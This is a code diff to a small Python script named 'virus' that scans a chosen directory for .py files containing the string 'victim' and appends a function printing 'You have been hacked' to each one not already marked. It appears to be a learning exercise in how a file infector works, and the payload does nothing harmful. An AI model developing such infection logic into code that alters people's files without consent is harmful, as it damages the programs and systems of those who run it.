@@ -14,6 +14,7 @@ import collections
 import argparse
 import os
 import glob
+import sys
 
 def main():
     parser = buildParser()
@@ -21,32 +22,42 @@ def main():
     dirToInfect = getParserArgs(args)
     if dirToInfect == "":
         print ("Please enter a directory to infect.")
+        sys.exit()
 
     for filename in glob.glob(os.path.join(dirToInfect, '*.py')):
-        with open(filename) as f:
-            program = f.readlines()
-            isFileToInfect = False
-            for line in program:
-                if "'victim'" in line:
-                    isFileToInfect = True
-                    # print ("file:" + filename + ", line: " + line)
-                if '"victim"' in line:
-                    isFileToInfect = True
-                    # print ("file:" + filename + ", line: " + line)
-            if isFileToInfect:
+        if 'virus.py' not in filename:
+            with open(filename) as f:
+                program = f.readlines()
+                isFileToInfect = False
+                alreadyInfected = False
+                for line in program:
+                    if "'victim'" in line:
+                        isFileToInfect = True
+                        # print ("file:" + filename + ", line: " + line)
+                    elif '"victim"' in line:
+                        isFileToInfect = True
+                        # print ("file:" + filename + ", line: " + line)
+                    elif 'def virusAdded ():' in line:
+                        alreadyInfected = True
+            f.close()
+            if isFileToInfect and alreadyInfected == False:
                 print ("File:" + filename)
-
+                program.append("\n")
+                program.append("\n")
+                program.append("def virusAdded ():\n")
+                program.append("    print ('You have been hacked')\n")
+                with open(filename, 'w') as overwriteFile:
+                    overwriteFile.writelines(program)
+                    overwriteFile.close()
 
 def buildParser():
     parser = argparse.ArgumentParser(description="virus")
     parser.add_argument('-d', metavar='d', nargs='+', help='Directory of files to infect.')
     return parser
 
-
 def getParserArgs(args):
     d = args.d[0]
     return d
-
 
 if __name__ == "__main__":
     main()
